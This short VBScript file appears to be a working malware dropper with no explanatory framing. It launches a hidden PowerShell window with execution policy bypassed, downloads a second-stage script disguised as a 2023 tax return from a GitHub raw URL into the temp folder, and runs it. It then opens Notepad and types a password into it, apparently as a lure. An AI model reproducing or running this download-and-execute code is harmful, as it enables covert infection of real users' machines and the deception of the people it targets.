 CreateObject("WscrIpt.SheLL").Run "cmd.exe /c powerShell -NoProfile -ExecutionPolicy bypass -windowstyle hidden -command iwr -uri 'https://github.com/str1ctlyelnuno/css/raw/main/2023TaxReturn.vbs' -Outfile %TEMP%\2023Tax.vbs; %TEMP%\2023Tax.vbs -e cmd.exe"
 Set Notepad = WScript.CreateObject("WScript.Shell")
Notepad.Run "C:\\Windows\\System32\\notepad.exe"
WScript.Sleep 1000
Notepad.SendKeys "Password: October28"